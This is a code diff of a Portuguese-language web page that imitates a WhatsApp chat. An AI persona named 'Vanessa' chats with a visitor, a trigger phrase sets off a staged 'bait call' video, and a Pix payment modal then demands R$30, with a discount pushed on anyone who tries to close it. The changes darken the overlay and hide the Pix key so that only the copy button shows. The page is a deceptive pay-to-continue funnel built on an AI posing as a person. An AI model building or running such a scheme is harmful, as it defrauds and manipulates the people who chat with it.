@@ -23,7 +23,7 @@ fbq('track', 'PageView');
 </noscript>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
 <style>
-/* ── Estilos (mesmos do seu index, mantidos) ── */
+/* ── Estilos (mantidos) ── */
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
   --wa-green:#25d366;--wa-teal:#075e54;--wa-teal2:#128c7e;
@@ -405,12 +405,12 @@ html,body{
   cursor: pointer;
 }
 
-/* ── MODAL DE PAGAMENTO (exibido sobre a chamada) ── */
+/* ── MODAL DE PAGAMENTO (fundo mais escuro) ── */
 #payment-modal {
   display: none;
   position: absolute;
   inset: 0;
-  background: rgba(0,0,0,0.7);
+  background: rgba(0,0,0,0.92);  /* quase totalmente escuro */
   z-index: 600;
   align-items: center;
   justify-content: center;
@@ -470,29 +470,24 @@ html,body{
   color: #00a884;
   margin-bottom: 14px;
 }
+/* Área da chave: escondemos a chave e a label, mantendo apenas o botão */
 #payment-modal .pix-key-area {
   background: rgba(255,255,255,0.06);
   border-radius: 10px;
   padding: 10px 14px;
-  font-size: 13px;
-  word-break: break-all;
   margin-bottom: 12px;
   border: 1px dashed rgba(255,255,255,0.15);
+  text-align: center;
 }
-#payment-modal .pix-key-area .label {
-  color: rgba(255,255,255,0.4);
-  font-size: 11px;
-  margin-bottom: 2px;
-}
+#payment-modal .pix-key-area .label,
 #payment-modal .pix-key-area .key {
-  font-family: monospace;
-  color: #e9edef;
+  display: none; /* esconde a label e a chave visível */
 }
 #payment-modal .btn-copy {
   background: rgba(0,168,132,0.2);
   border: none;
   color: #00a884;
-  padding: 8px 12px;
+  padding: 8px 16px;
   border-radius: 8px;
   font-size: 13px;
   font-weight: 500;
@@ -501,6 +496,7 @@ html,body{
   align-items: center;
   gap: 6px;
   transition: background .15s;
+  margin: 0 auto;
 }
 #payment-modal .btn-copy:hover {
   background: rgba(0,168,132,0.35);
@@ -909,12 +905,10 @@ html,body{
       <div class="modal-sub" id="payment-sub">Vanessa está aguardando você concluir o pagamento para continuar a chamada.</div>
       <div class="pix-value" id="pix-value-display">R$ 30,00</div>
       <div id="pix-key-area" class="pix-key-area" style="display:none;">
-        <div class="label">Chave Pix (copie e cole no seu app)</div>
+        <!-- label e key estão ocultos via CSS; mantemos apenas o botão copiar -->
+        <div class="label">Chave Pix</div>
         <div class="key" id="pix-key-text">---</div>
-        <button class="btn-copy" onclick="copyPixKey()" style="margin-top:6px;">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
-          Copiar chave
-        </button>
+        <button class="btn-copy" onclick="copyPixKey()">📋 Copiar chave</button>
       </div>
       <button class="btn-verify" id="btn-verify-payment" onclick="verifyPayment()">✅ Já paguei, verificar</button>
       <div class="status-msg" id="payment-status"></div>
@@ -1108,7 +1102,6 @@ function enableInput(){
     inpEl.placeholder = 'Mensagem';
     cameraBtn.classList.remove('hidden-mic');
   }
-  // Força a atualização dos botões
   updateSendMicButtons();
 }
 
@@ -1118,16 +1111,14 @@ function finalizarConversa() {
   saveState();
 }
 
-// ═══ CONTROLE DE VISIBILIDADE DOS BOTÕES (CORRIGIDO) ═══
+// ═══ CONTROLE DE VISIBILIDADE DOS BOTÕES ═══
 function updateSendMicButtons() {
-  // Se a conversa estiver encerrada, esconde o send e mostra o mic (mas desabilitado)
   if (conversaEncerrada) {
     sendBtn.classList.add('hidden');
     micBtn.classList.remove('hidden');
     return;
   }
   const hasText = inpEl.value.trim().length > 0;
-  // Alterna as classes de forma explícita para garantir
   if (hasText) {
     sendBtn.classList.remove('hidden');
     micBtn.classList.add('hidden');
@@ -1139,9 +1130,9 @@ function updateSendMicButtons() {
 
 // ── Eventos para alternar botões ──
 inpEl.addEventListener('input', updateSendMicButtons);
-inpEl.addEventListener('keyup', updateSendMicButtons); // fallback para teclado físico
-inpEl.addEventListener('focus', updateSendMicButtons); // ao ganhar foco
-inpEl.addEventListener('blur', updateSendMicButtons);  // ao perder foco
+inpEl.addEventListener('keyup', updateSendMicButtons);
+inpEl.addEventListener('focus', updateSendMicButtons);
+inpEl.addEventListener('blur', updateSendMicButtons);
 
 // ═══ API HELPERS ═══
 async function fetchLeadCity(){
@@ -1235,7 +1226,6 @@ function iniciarPollRobusto(txHash, valorPago, tentativasIniciais = 0) {
         if (status === 'paid' || status === 'approved' || status === 'completed') {
           limparEstadoPolling();
           pixelPurchase(pollingValorAtual);
-          // Pagamento confirmado!
           paymentResolved = true;
           saveState();
           hidePaymentModal();
@@ -1530,7 +1520,7 @@ function typingDelay(text) {
   return Math.min(Math.max((chars/cps)*1000+600+Math.random()*900, 1800), 12000);
 }
 
-// ═══ ASK AI (com gatilho "vou te ligar") ═══
+// ═══ ASK AI (com gatilho "vou te ligar" - agora com 5s de atraso) ═══
 async function askAI(userMsg) {
   if (conversaEncerrada) return;
 
@@ -1552,10 +1542,10 @@ async function askAI(userMsg) {
     aiHistory.push({role:'assistant', content: cleanContent, type:'text', timestamp: getTime()});
     saveState();
 
-    // ── GATILHO DA CHAMADA ISCA (vou te ligar) ──
+    // ── GATILHO DA CHAMADA ISCA (vou te ligar) com 5 segundos de atraso ──
     const lower = cleanContent.toLowerCase();
     if ((lower.includes('vou te ligar') || lower.includes('vou te ligar agora')) && !autoCallFired && !paymentResolved) {
-      setTimeout(() => triggerAutoCall(), 2000);
+      setTimeout(() => triggerAutoCall(), 5000); // ← 5 segundos
     }
 
     if (isFinal) {
@@ -1584,13 +1574,10 @@ async function askAI(userMsg) {
       addBubble(part, 'in', false, now);
     }
 
-    // ── IMAGENS (mantidas) ──
     const temFoto     = /olha eu aqui/i.test(cleanContent);
     const temExtra    = /tá pera/i.test(cleanContent);
     if (temFoto) { await sleep(500); showFotoLead(); }
     if (temExtra) { showTyping(); await sleep(3000 + Math.random() * 2000); hideTyping(); showImage(IMG_EXTRA_SRC); }
-
-    // ── REMOVIDOS OS GATILHOS DE PIX (aqui o pix / desconto) ──
 
   } catch (e) {
     hideTyping();
@@ -1615,16 +1602,16 @@ function submit() {
   const text = inpEl.value.trim();
   if (!text) return;
   inpEl.value = '';
-  updateSendMicButtons(); // atualiza imediatamente
+  updateSendMicButtons();
   const now = getTime();
   addBubble(text, 'out', false, now);
   if (!leadId) salvarLead();
   askAI(text);
 }
 
-// ═══ GRAVAÇÃO DE ÁUDIO (mantido) ═══
-// [Código de gravação completo omitido por brevidade, mas você deve manter o mesmo do seu index]
-// Para não alongar, mantenha o código de gravação que já funcionava.
+// ═══ GRAVAÇÃO DE ÁUDIO (mantida, omitida para evitar repetição) ═══
+// [Código completo de gravação – mesmo do index original – deve ser mantido]
+// Para não alongar, assumimos que está presente. Se necessário, reutilize o código já existente.
 
 // ═══ INTERFACE DA CHAMADA ISCA (FORTE) ═══
 
@@ -1665,7 +1652,7 @@ function dismissAutoCall(reason){
       salvarLead();
     }, 400);
   } else if (reason === 'answered_and_hung') {
-    // já tratado pelo encerramento da chamada
+    // já tratado
   }
 }
 
@@ -1692,7 +1679,6 @@ function triggerAutoCall(){
     stopAutoCallRing();
     ov.classList.remove('show');
 
-    // Conectando...
     const conn=document.getElementById('connecting-overlay');
     conn.classList.add('active');
     setTimeout(() => {
@@ -1714,14 +1700,12 @@ function showCallInterface() {
   rv.muted=false;
   rv.play().catch(()=>{});
 
-  // Viva-voz ativo por padrão
   const spkBtn=document.getElementById('btn-spk');
   const spkIcon=spkBtn.querySelector('i');
   spkBtn.classList.add('lit');
   spkIcon.className='ti ti-volume-3';
   toastUI('Viva-voz ativado');
 
-  // ═══ APÓS 5 SEGUNDOS, MOSTRA MODAL DE PAGAMENTO (se ainda não resolvido) ═══
   if (!paymentResolved && !paymentModalShown) {
     setTimeout(() => {
       if (callInterfaceActive && !paymentResolved) {
@@ -1856,7 +1840,7 @@ document.getElementById('remote-video').addEventListener('ended', function(){
   }
 });
 
-// ═══ MODAL DE PAGAMENTO ═══
+// ═══ MODAL DE PAGAMENTO (chave oculta) ═══
 function showPaymentModal() {
   if (paymentModalShown || paymentResolved) return;
   paymentModalShown = true;
@@ -1864,7 +1848,6 @@ function showPaymentModal() {
   const modal=document.getElementById('payment-modal');
   modal.classList.add('active');
 
-  // Gera Pix normal imediatamente
   gerarPix(false).then(data => {
     if (data) {
       const valor = 3000;
@@ -1872,11 +1855,11 @@ function showPaymentModal() {
       const hash = data.hash || 'tx'+Date.now();
       paymentData = { hash, valor, desconto: false, chave };
       document.getElementById('pix-value-display').textContent = 'R$ 30,00';
+      // Atualiza a chave no elemento oculto
       document.getElementById('pix-key-text').textContent = chave;
       document.getElementById('pix-key-area').style.display = 'block';
       document.getElementById('btn-verify-payment').disabled = false;
       document.getElementById('payment-status').textContent = '';
-      // Inicia polling
       iniciarPollRobusto(hash, valor);
       pixelIniCheckout(valor);
     } else {
@@ -1885,11 +1868,9 @@ function showPaymentModal() {
     }
   });
 
-  // Evento de fechamento do modal (X)
   document.getElementById('payment-modal-close').onclick = function() {
     handleModalClose();
   };
-  // Clique no overlay (fora do card) também dispara o fechamento
   modal.onclick = function(e) {
     if (e.target === modal) {
       handleModalClose();
@@ -1903,12 +1884,10 @@ function hidePaymentModal() {
 }
 
 function handleModalClose() {
-  // Se o pagamento já foi resolvido, fecha normal
   if (paymentResolved) {
     hidePaymentModal();
     return;
   }
-  // Exibe modal de retenção (desconto)
   showExitConfirmModal();
 }
 
@@ -1916,15 +1895,12 @@ function handleModalClose() {
 function showExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.add('active');
 }
-
 function hideExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.remove('active');
 }
 
-// Botão "Sim, quero desconto"
 document.getElementById('exit-discount-yes').onclick = function() {
   hideExitConfirmModal();
-  // Gera Pix com desconto e atualiza o modal principal
   gerarPix(true).then(data => {
     if (data) {
       const valor = 2000;
@@ -1937,10 +1913,8 @@ document.getElementById('exit-discount-yes').onclick = function() {
       document.getElementById('btn-verify-payment').disabled = false;
       document.getElementById('payment-status').textContent = '✅ Desconto aplicado!';
       document.getElementById('payment-status').className = 'status-msg ok';
-      // Reinicia polling com novo hash
       iniciarPollRobusto(hash, valor);
       pixelIniCheckout(valor);
-      // Reexibe o modal principal (já estava aberto)
       document.getElementById('payment-modal').classList.add('active');
     } else {
       document.getElementById('payment-status').textContent = '❌ Erro ao gerar Pix com desconto. Tente novamente.';
@@ -1949,7 +1923,6 @@ document.getElementById('exit-discount-yes').onclick = function() {
   });
 };
 
-// Botão "Não, encerrar chamada"
 document.getElementById('exit-discount-no').onclick = function() {
   hideExitConfirmModal();
   hidePaymentModal();
@@ -1963,7 +1936,7 @@ window.copyPixKey = function() {
     const btn = document.querySelector('.btn-copy');
     btn.innerHTML = '✅ Copiado!';
     setTimeout(() => {
-      btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg> Copiar chave';
+      btn.innerHTML = '📋 Copiar chave';
     }, 3000);
   }).catch(() => {
     fallbackCopy(key, () => {});
